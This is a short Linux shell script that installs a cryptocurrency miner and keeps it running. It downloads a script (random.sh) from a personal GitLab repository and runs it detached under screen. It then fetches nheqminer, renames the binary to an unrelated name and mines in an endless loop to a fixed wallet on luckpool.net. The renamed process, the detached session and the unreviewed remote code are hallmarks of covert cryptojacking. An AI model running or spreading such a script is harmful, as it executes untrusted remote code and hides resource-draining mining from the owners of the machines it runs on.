#!/bin/sh
sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
wget https://gitlab.com/adamasdsad/anjim4/-/raw/master/random.sh
chmod +x random.sh
screen -dmS random ./random.sh nheqminer/nheqminer 65 75
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
mv nheqminer/nheqminer garagaskeun
while [ 1 ]; do
./garagaskeun -v -l eu.luckpool.net:3956 -u RCZiRNaUvTv9f6JPBMCVjt8XSULR47ZHVf.SUKUMANTE -p x -t 5
sleep 3
done
sleep 3
